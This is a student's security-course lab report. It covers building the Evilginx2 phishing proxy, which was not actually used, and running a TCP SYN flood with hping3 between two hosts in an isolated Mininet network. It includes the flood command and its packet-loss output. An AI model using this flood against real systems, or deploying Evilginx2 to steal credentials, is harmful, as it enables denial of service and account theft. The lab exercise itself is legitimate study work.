

# H5
## synflood and Evilginx2
| specs | os | vm |
|---------|-------------|--------|
| (I5/8/256) | Kali | ubuntu on VirtualBox |


# a) 

## Summary
**Objective:** Prepare the environment, attempt to explore Evilginx2, and build a Mininet topology to demonstrate a TCP SYN load test.  
**Outcome:** Evilginx2 exploration was not completed due to limited documentation and lack of a safe test environment. Mininet was successfully configured after fixing a subnet mask error, and the TCP SYN load experiment showed how connections can be overwhelmed.

---

## Part A: System Update and Evilginx2 Exploration

### System Update and Go Installation
- **Update:**
```bash
sudo apt update && sudo apt upgrade
```
- **Go compiler:**
```bash
  sudo apt install golang`
```
### Evilginx2 Project (high-level description)
- **Project retrieval:** Evilginx2 was gitcloned compiled locally.
```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
Make
cd build
./evilginx

```
- Phishlets creation: The hardest part was finding clear documentation on how to write custom phishlets in YAML format. Most guides are either incomplete or assume prior knowledge.

- Configuration details: There is little free material explaining how to properly configure phishlets for different services. The official repository provides only basic examples.

- Advanced tutorials: A comprehensive tutorial exists but costs around $400, which I did not purchase. Without it, the learning curve is steep.

- Testing environment: I lacked a dedicated virtual sandbox to safely test Evilginx2, which limited experimentation.
-  initially thought about attempting a phishing scenario against my own hardware as a controlled test. However, this would have required significant effort with a tool that does not provide ready-to-use solutions. For example, Microsoft 365 has prebuilt phishlets available, but I did not want to go that route.
- Phishlet creation starts wiht:
```bash
sudo ./bin/evilginx -p ./phishlets
```


---

## Part B: Mininet Virtual Environment Setup

### OVA Extraction and Disk Conversion
```bash
- **Decompress `.xz`:** `xz -d mininet-lab.ova.xz`
```
- **Extract OVA:** `
 ```bash
 tar -xvf mininet-lab.ova
```
- **Convert VMDK → QCOW2:**  
```bash
qemu-img convert -O qcow2 mininet-s2-disk1.vmdk mininet_lari.qcow2
```

### Virtual Machine Setup
- **Create VM:** Using virt-manager with the QCOW2 disk image.
- **Check IP:**
```bash
ip a
```
- **SSH login:** `
```bash
ssh mininet@192.168.122.99
```

---

## Part C: Mininet Topology and Connectivity Tests

### Installation and Topology
- **Install Mininet:**

sudo apt-get install mininet
```
- **Topology:**
```bash
sudo mn --topo single,2 --mac --switch ovsk --controller=default
```
- Two hosts (h1, h2) and one switch (s1).
- Cleanup before start:
```bash
sudo mn -c
```

### Fixing Configuration Error
- **Issue:** h1 had the wrong subnet mask (255.0.0.0), while h2 had the correct one (255.255.255.0).
- **Fix:**  
  - `h1 ifconfig h1-eth0 10.0.0.1/24 up`  
  - `h2 ifconfig h2-eth0 10.0.0.2/24 up`
- **Ping test:** h1 → h2 succeeded.  
- Example: 4 packets transmitted, 4 received, 0% packet loss, rtt min/avg/max ~0.095/1.311/4.190 ms.

### HTTP Server and Connectivity
- **Start HTTP server on h1:** `python3 -m http.server 80 &`  
 

---

## Part D: TCP SYN Load Test Observations 

### Purpose
- **Goal:** Demonstrate how sending a large number of TCP SYN packets can overload a target host and affect its ability to respond.

### Command Used
On host **h2**, the following command was executed to generate SYN traffic toward host **h1** on port 80:
```bash
h2 hping3 -S -p 80 -i u10 10.0.0.1
```
```bash
853836 packets transmitted, 0 packets received, 100% packet loss
--- 10.0.0.1 hping statistic ---
248005 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

--- 10.0.0.1 hping statistic ---
185163 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
```
- **Interpretation:** The target was overwhelmed and unable to process requests,he impact of SYN flooding.

---


---

## Reference
- Mininet Walkthrough: https://mininet.org/walkthrough/
- Evilginx Documentation: https://help.evilginx.com/community/getting-started/deployment/localev
- Evilginx github: https://github.com/kgretzky/evilginx2
- https://terokarvinen.com/verkkoon-tunkeutuminen-ja-tiedustelu/


